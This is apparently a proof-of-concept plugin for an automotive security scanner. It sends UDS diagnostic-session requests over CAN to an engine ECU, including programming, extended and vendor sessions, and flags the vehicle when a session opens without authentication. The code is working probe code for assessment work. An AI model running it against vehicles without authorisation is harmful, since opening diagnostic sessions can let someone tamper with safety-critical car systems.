"""
PoC Name: UDS Diagnostic Session Bypass
CVE: N/A
Component: UDS Protocol (ISO 14229)
Category: Protocol
Severity: High
CVSS: 7.5
Description: 尝试通过UDS 0x10服务直接进入扩展诊断会话,检测是否缺少访问控制。
Prerequisites: PCAN接口, python-can库, PCAN驱动。
Usage: python3 26_UDS_DiagSession_Bypass.py PCAN_USBBUS1
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
class UDSDiagSessionPlugin(IVIVulnerabilityPlugin):
    meta_poc_name = "UDS Diagnostic Session Bypass"
    meta_cve_id = "N/A"
    meta_severity = "High"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self): return True
    def exploit(self):
        iface = self.params.get("can_interface", "PCAN_USBBUS1")
        self.logger.info(f"UDS诊断会话测试 ({iface})...")
        try:
            import can
            if "PCAN" in iface:
                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
            else:
                bus = can.interface.Bus(channel=iface, bustype="socketcan")
            sessions = [(0x02, "Programming"), (0x03, "ExtendedDiag"), (0x60, "Vendor")]
            for sub, name in sessions:
                msg = can.Message(arbitration_id=0x7E0,
                    data=[0x02, 0x10, sub, 0,0,0,0,0], is_extended_id=False)
                bus.send(msg)
                resp = bus.recv(timeout=1.0)
                if resp and len(resp.data) > 1:
                    if resp.data[1] == 0x50:
                        self.logger.warning(f"[+] {name}会话(0x{sub:02X})已开启！无需认证")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = f"UDS session 0x{sub:02X} opened without auth"
                        bus.shutdown()
                        return self.results
                    elif resp.data[1] == 0x7F:
                        nrc = resp.data[3] if len(resp.data) > 3 else 0
                        self.logger.info(f"  {name}(0x{sub:02X}) 被拒绝 NRC=0x{nrc:02X}")
            bus.shutdown()
            self.logger.info("所有诊断会话均需要认证")
            self.results["vulnerable"] = False
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"UDS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 26_UDS_DiagSession_Bypass.py <can_interface>")
        sys.exit(1)
    plugin = UDSDiagSessionPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
    plugin.run_verify()
